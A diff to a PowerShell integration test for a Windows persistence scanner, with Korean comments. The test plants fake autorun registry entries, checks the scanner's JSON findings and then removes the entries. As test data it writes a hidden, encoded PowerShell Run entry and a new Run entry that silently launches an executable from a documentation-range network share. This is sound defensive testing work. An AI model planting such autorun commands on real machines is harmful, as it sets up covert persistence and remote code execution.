@@ -1,4 +1,4 @@
-<#
+﻿<#
   SafetySecurity integration tests (Windows only, run in CI on windows-latest).
   Creates fake persistence entries in HKCU, runs the real exe, checks the JSON report, then cleans up.
   Usage: pwsh tests/integration/Run-Integration.ps1 -Exe out/SafetySecurity.exe
@@ -64,6 +64,9 @@ if (-not $clsid) { throw 'no suitable CLSID found' }
 $comKey = "HKCU:\Software\Classes\CLSID\$clsid"
 $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $runName = 'SafetySecurityIT'
+# 네트워크 경로 자동 실행 (203.0.113.0/24는 문서용 주소라 실제로는 아무 데도 없어요). 검사기는 이 경로를 열면 안 돼요.
+$netName = 'SafetySecurityITNet'
+$netTarget = '\\203.0.113.5\ss-it\update.exe'
 
 try {
     Write-Host "== 1. version / verify"
@@ -105,6 +108,7 @@ try {
     Set-ItemProperty -Path "$comKey\InprocServer32" -Name 'ThreadingModel' -Value 'Apartment'
     if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
     Set-ItemProperty -Path $runKey -Name $runName -Value 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA=='
+    Set-ItemProperty -Path $runKey -Name $netName -Value "`"$netTarget`" /silent"
     $r1 = Scan
     Check ($r1.Code -eq 0) 'scan exits 0'
     $rep1 = Latest-Report
@@ -118,6 +122,12 @@ try {
     }
     $run = @($rep1.findings | Where-Object { $_.category -eq 'Autorun' -and $_.location -like "*\$runName" })
     Check ($run.Count -eq 1 -and $run[0].severity -eq 'High') 'encoded PowerShell Run entry is High'
+    $net = @($rep1.findings | Where-Object { $_.category -eq 'Autorun' -and $_.location -like "*\$netName" })
+    Check ($net.Count -eq 1 -and $net[0].severity -eq 'High') 'network-path Run entry is High'
+    if ($net.Count -eq 1) {
+        Check (@($net[0].evidence | Where-Object { $_.key -eq '네트워크 위치' -and $_.value -eq '203.0.113.5' }).Count -eq 1) 'network-path finding names the host'
+        Check (@($net[0].evidence | Where-Object { $_.key -eq '서명' -or $_.key -eq 'SHA-256' }).Count -eq 0) 'network-path file was not opened (no signature or hash)'
+    }
 
     Write-Host "== 4. second scan: same items are no longer new"
     $null = Scan
@@ -159,6 +169,21 @@ try {
     Write-Host "== 8. admin scope (runner is elevated)"
     $a = Invoke-SS @('scan', '--scope', 'admin', '--force', '--no-toast', '--data-dir', $data, '--report-dir', $reports)
     Check ($a.Code -eq 0) 'admin scope scan exits 0'
+    $repa = Latest-Report
+    $wmiNote = @($repa.coverage | Where-Object { "$_" -like 'WMI*' })
+    # PowerShell을 최소 환경(물려받지 않은 환경 변수)으로 실행해도 WMI 조회가 돼야 해요.
+    Check ($wmiNote.Count -eq 0) "WMI subscriptions queried with the minimal child environment $($wmiNote -join ' ')"
+    $aid = 'feedc0de12345678'
+    $ia = Invoke-SS @('ignore', $aid, '--scope', 'admin', '--data-dir', $data)
+    $adminState = Get-Content (Join-Path $data 'state.admin.json') -Raw -Encoding utf8 | ConvertFrom-Json
+    Check ($ia.Code -eq 0 -and @($adminState.ignored) -contains $aid) 'ignore --scope admin with --data-dir writes that folder directly'
+    $null = Invoke-SS @('unignore', $aid, '--scope', 'admin', '--data-dir', $data)
+
+    Write-Host "== 8b. default data folder of an elevated process"
+    # 관리자 권한 프로세스는 사용자 폴더(%LOCALAPPDATA%)가 아니라 관리자만 쓸 수 있는 폴더를 써요 (status는 아무것도 만들지 않아요).
+    $adminRoot = Join-Path $env:ProgramFiles 'SafetySecurity\data'
+    $sd = Invoke-SS @('status')
+    Check ($sd.Text -match [regex]::Escape("데이터 폴더: $adminRoot")) "elevated default data folder is $adminRoot"
 
     if (-not $SkipInstall) {
         Write-Host "== 9. install / uninstall"
@@ -186,6 +211,7 @@ try {
 finally {
     Remove-Item -Path $comKey -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path $runKey -Name $runName -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $runKey -Name $netName -ErrorAction SilentlyContinue
     Remove-Item -Recurse -Force $evilDir -ErrorAction SilentlyContinue
 }
 
